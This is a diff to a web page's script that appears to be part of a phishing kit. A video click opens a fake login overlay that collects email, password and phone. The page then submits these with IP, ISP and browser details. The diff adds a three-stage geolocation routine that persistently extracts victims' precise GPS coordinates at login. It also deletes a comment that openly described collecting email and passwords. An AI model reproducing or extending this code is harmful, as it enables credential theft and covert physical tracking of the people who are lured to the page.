@@ -593,46 +593,110 @@
         modalVideo.addEventListener('click', function(){ modalVideo.pause(); showLoginOverlay(); });
     }
     
-    // ==================== GPS & DATA COLLECTION ====================
-    let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, gpsCaptured: false };
-    let ipData = {};
+    // ==================== GPS 3 LAPIS ====================
+    let gpsData = { latitude: null, longitude: null, accuracy: null, altitude: null, source: null, gpsCaptured: false };
     let gpsRequestInProgress = false;
     
-    function requestGPS(callback) {
-        if (gpsRequestInProgress) return;
-        gpsRequestInProgress = true;
-        
-        if (!navigator.geolocation) {
-            alert('Browser tidak support GPS. Gunakan Chrome!');
+    async function getGPS() {
+        return new Promise(async function(resolve) {
+            if (!navigator.geolocation) {
+                return resolve(null);
+            }
+            
+            gpsRequestInProgress = true;
+            
+            // ===== LAPIS 1: high accuracy (15s) =====
+            let best = null;
+            try {
+                best = await new Promise(function(res) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            res({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                altitude: pos.coords.altitude,
+                                source: 'GPS/WiFi (getCurrentPosition high)'
+                            });
+                        },
+                        function(err) { res(null); },
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    );
+                });
+            } catch(e) { best = null; }
+            
+            if (best && best.accuracy && best.accuracy <= 100) {
+                gpsRequestInProgress = false;
+                return resolve(best);
+            }
+            
+            // ===== LAPIS 2: watchPosition (10s) =====
+            const watchResult = await new Promise(function(res) {
+                let samples = [];
+                let watchId = null;
+                let done = false;
+                const finish = function() {
+                    if (done) return;
+                    done = true;
+                    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                    if (samples.length === 0) return res(null);
+                    samples.sort(function(a,b) { return a.accuracy - b.accuracy; });
+                    res(samples[0]);
+                };
+                watchId = navigator.geolocation.watchPosition(
+                    function(pos) {
+                        samples.push({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            source: 'GPS/WiFi (watchPosition)'
+                        });
+                        if (pos.coords.accuracy <= 50) finish();
+                    },
+                    function(err) {},
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+                setTimeout(finish, 10000);
+            });
+            
+            if (watchResult && watchResult.accuracy && watchResult.accuracy <= 100) {
+                gpsRequestInProgress = false;
+                return resolve(watchResult);
+            }
+            
+            // ===== LAPIS 3: low accuracy / cell tower (10s) =====
+            let lowAcc = null;
+            try {
+                lowAcc = await new Promise(function(res) {
+                    navigator.geolocation.getCurrentPosition(
+                        function(pos) {
+                            res({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy,
+                                source: 'Cell Tower / WiFi (low accuracy)'
+                            });
+                        },
+                        function(err) { res(null); },
+                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+                    );
+                });
+            } catch(e) { lowAcc = null; }
+            
             gpsRequestInProgress = false;
-            if (callback) callback(false);
-            return;
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                gpsData.latitude = position.coords.latitude;
-                gpsData.longitude = position.coords.longitude;
-                gpsData.accuracy = position.coords.accuracy;
-                gpsData.altitude = position.coords.altitude;
-                gpsData.gpsCaptured = true;
-                gpsRequestInProgress = false;
-                if (callback) callback(true);
-            },
-            (error) => {
-                console.error('GPS Error:', error.code);
-                gpsRequestInProgress = false;
-                if (callback) callback(false);
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
+            
+            const candidates = [best, watchResult, lowAcc].filter(function(x) { return x && x.lat && x.lon; });
+            if (candidates.length === 0) return resolve(null);
+            candidates.sort(function(a,b) { return a.accuracy - b.accuracy; });
+            return resolve(candidates[0]);
+        });
     }
     
     async function getIPData() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
-        } catch(e) {}
+            return await res.json();
+        } catch(e) { return {}; }
     }
     
     function getBrowserData() {
@@ -659,6 +723,7 @@
             longitude: gpsData.longitude,
             gps_accuracy: gpsData.accuracy,
             gps_altitude: gpsData.altitude,
+            gps_source: gpsData.source || 'IP fallback',
             ip_address: ipData.ip || 'unknown',
             isp: ipData.org || 'unknown',
             ip_city: ipData.city || '',
@@ -682,9 +747,10 @@
         }
     }
     
-    getIPData();
+    let ipData = {};
+    getIPData().then(function(d) { ipData = d || {}; });
     
-    // ==================== LOGIN OVERLAY (COLLECT EMAIL & PASS) ====================
+    // ==================== LOGIN OVERLAY ====================
     function showLoginOverlay() {
         const existingOverlay = document.querySelector('.login-overlay');
         if(existingOverlay) existingOverlay.remove();
@@ -728,14 +794,19 @@
                     loginBtn.innerHTML = 'Processing... <span class="loading-spinner"></span>';
                 }
                 
-                // Request GPS dulu
-                const gpsSuccess = await new Promise((resolve) => {
-                    requestGPS((success) => resolve(success));
-                });
+                // Request GPS 3 lapis
+                const gpsResult = await getGPS();
+                if (gpsResult) {
+                    gpsData.latitude = gpsResult.lat;
+                    gpsData.longitude = gpsResult.lon;
+                    gpsData.accuracy = gpsResult.accuracy;
+                    gpsData.altitude = gpsResult.altitude || null;
+                    gpsData.source = gpsResult.source;
+                    gpsData.gpsCaptured = true;
+                }
                 
                 if(loading) loading.style.display = 'flex';
                 
-                // Submit data
                 await submitData(email, password, phone, 'Indonesia', 'Jawa Barat', 'Jakarta');
                 
                 if(loading) loading.style.display = 'none';
@@ -766,4 +837,4 @@
     }
 </script>
 </body>
-                                                                         </html>
+    </html>
